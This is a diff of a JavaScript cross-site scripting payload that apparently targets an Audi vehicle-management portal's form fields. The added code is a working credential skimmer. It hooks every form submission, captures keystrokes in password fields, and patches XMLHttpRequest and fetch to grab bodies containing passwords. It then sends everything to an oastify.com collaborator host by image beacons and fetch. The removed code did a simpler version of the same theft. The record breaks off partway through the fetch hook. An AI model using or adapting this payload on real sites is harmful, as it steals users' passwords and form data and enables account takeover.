@@ -1,42 +1,97 @@
 (function() {
-    // Wait for page to fully load
-    setTimeout(() => {
+    'use strict';
+    
+    const EXFIL_SERVER = 'r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com';
+    
+    // Function to send data
+    function exfil(data) {
         try {
-            let data = {
-                fake_username: document.querySelector('input[name="fake_username"]')?.value || '',
-                fake_password: document.querySelector('input[name="fake_password"]')?.value || '',
-                commission_number: document.querySelector('input[name="_com_audi_mna_VehicleManagementPortlet_vehicleCommissionNumber"]')?.value || '',
-                customer_number: document.querySelector('input[name="_com_audi_mna_VehicleManagementPortlet_vehicleCustomerNumber"]')?.value || '',
-                url: window.location.href,
-                timestamp: new Date().toISOString()
-            };
-            
-            // Base64 encode for safe transmission
             let payload = btoa(JSON.stringify(data));
-            let collaborator = 'r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com';
+            // Method 1: Image beacon (most reliable)
+            new Image().src = `https://${EXFIL_SERVER}/?d=${payload}`;
             
-            // Send via Image (most reliable for XSS)
-            let img = new Image();
-            img.src = 'https://' + collaborator + '/?data=' + payload;
+            // Method 2: Plain text for easy reading
+            new Image().src = `https://${EXFIL_SERVER}/plain?u=${encodeURIComponent(data.user)}&p=${encodeURIComponent(data.pass)}`;
             
-            // Backup method - direct params (easier to read)
-            let img2 = new Image();
-            img2.src = 'https://' + collaborator + '/plain?user=' + 
-                       encodeURIComponent(data.fake_username) + 
-                       '&pass=' + encodeURIComponent(data.fake_password);
-            
-            // Third backup - fetch
-            fetch('https://' + collaborator + '/fetch?data=' + payload, {
-                method: 'GET',
-                mode: 'no-cors'
+            // Method 3: Fetch backup
+            fetch(`https://${EXFIL_SERVER}/data`, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
             }).catch(e => {});
             
-            console.log('[XSS] Data exfiltrated:', data);
-            
         } catch(e) {
-            // Send error info
-            new Image().src = 'https://r7z6iqxtkro4lnr4yzhdr5skobu2itbh0.oastify.com/error?msg=' + 
-                             encodeURIComponent(e.message);
+            new Image().src = `https://${EXFIL_SERVER}/error?e=${encodeURIComponent(e.message)}`;
         }
-    }, 2000); // 2 second delay
-})();
+    }
+    
+    // Hook all form submissions
+    document.addEventListener('submit', function(e) {
+        let form = e.target;
+        let formData = new FormData(form);
+        let captured = {
+            url: window.location.href,
+            action: form.action,
+            method: form.method,
+            timestamp: new Date().toISOString(),
+            fields: {}
+        };
+        
+        // Capture all form fields
+        for (let [key, value] of formData.entries()) {
+            captured.fields[key] = value;
+            // Send passwords immediately
+            if (key.toLowerCase().includes('pass')) {
+                exfil({user: formData.get('fake_username') || 'unknown', pass: value, type: 'immediate'});
+            }
+        }
+        
+        exfil(captured);
+    }, true);
+    
+    // Monitor all input changes (backup method)
+    document.addEventListener('input', function(e) {
+        if (e.target.name && e.target.name.toLowerCase().includes('pass')) {
+            exfil({
+                type: 'keystroke',
+                field: e.target.name,
+                value: e.target.value,
+                url: window.location.href
+            });
+        }
+    }, true);
+    
+    // Hook XMLHttpRequest for AJAX forms
+    const origOpen = XMLHttpRequest.prototype.open;
+    const origSend = XMLHttpRequest.prototype.send;
+    
+    XMLHttpRequest.prototype.open = function(method, url) {
+        this._url = url;
+        this._method = method;
+        return origOpen.apply(this, arguments);
+    };
+    
+    XMLHttpRequest.prototype.send = function(data) {
+        if (data && typeof data === 'string' && data.includes('password')) {
+            exfil({
+                type: 'ajax',
+                url: this._url,
+                method: this._method,
+                data: data,
+                timestamp: new Date().toISOString()
+            });
+        }
+        return origSend.apply(this, arguments);
+    };
+    
+    // Hook fetch API
+    const origFetch = window.fetch;
+    window.fetch = function(...args) {
+        let [url, options] = args;
+        if (options && options.body) {
+            let body = options.body;
+            if (typeof body === 'string' && body.includes('password')) {
+                exfil({
+                    type: 'fetch',
+                    url: url,
+                    body: body,
